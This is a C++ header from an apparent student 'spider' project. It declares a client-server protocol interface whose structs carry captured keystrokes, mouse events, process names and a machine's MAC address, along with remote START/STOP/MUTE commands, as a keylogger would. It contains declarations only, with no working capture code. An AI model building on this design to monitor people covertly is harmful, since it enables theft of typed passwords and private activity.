//
// IProtocol.hpp for IProtocol in /home/plasko_a/projet/cplusplus/cpp_spider
// 
// Made by Antoine Plaskowski
// Login   <antoine.plaskowski@epitech.eu>
// 
// Started on  Wed Oct 21 23:48:57 2015 Antoine Plaskowski
// Last update Thu Nov  5 21:31:19 2015 Antoine Plaskowski
//

#ifndef		IPROTOCOL_HPP_
# define	IPROTOCOL_HPP_

# include	<cstdint>
# include	<list>
# include	"ITime.hpp"
# include	"ISocket.hpp"

class	IProtocol
{
public:
  enum  Commandcode : uint8_t
  {
    START = 0,
    STOP = 1,
    MUTE = 2,
    UNMUTE = 3
  };
  struct	Log
  {
    std::string	log;
  };
  struct	Keyboard
  {
    ITime	&time;
    std::string	event;
    std::string	key;
    std::string	process;
  };
  struct	Mouse
  {
    ITime	&time;
    uintmax_t	x;
    uintmax_t	y;
    uintmax_t	amount;
    std::string	event;
    std::string	button;
    std::string	process;
  };
public:
  virtual ~IProtocol(void);
  virtual bool	run(ITime const *timeout = nullptr) = 0;
  virtual bool	select(void) const = 0;
  virtual bool	server_command(Commandcode command) = 0;
  virtual bool	mac_address(std::string const &mac_address) = 0;
  virtual bool	keyboard(std::list<Keyboard *> const &keyboard) = 0;
  virtual bool	log(std::list<Log *> const &log) = 0;
  virtual bool	mouse(std::list<Mouse *> const &mouse) = 0;
  virtual ISocket const	&get_isocket(void) const = 0;
  virtual std::string const	&get_mac_address(void) const = 0;
  virtual std::list<Log *>	&get_log(void) = 0;
  virtual std::list<Keyboard *>	&get_keyboard(void) = 0;
  virtual std::list<Mouse *>	&get_mouse(void) = 0;
};

extern "C"
{
# define	NAME_FCT_NEW_IPROTOCOL	"new_iprotocol"
# ifdef	__linux__
  IProtocol	&new_iprotocol(ISocket &socket, ITime &time);
# else
  __declspec(dllexport) IProtocol	&new_iprotocol(ISocket &socket, ITime &time);
# endif
  typedef	IProtocol	&(*fct_new_iprotocol)(ISocket &socket, ITime &time);
  typedef	IProtocol	&(&ref_new_iprotocol)(ISocket &socket, ITime &time);
}
  
#endif		/* !IPROTOCOL_HPP_ */
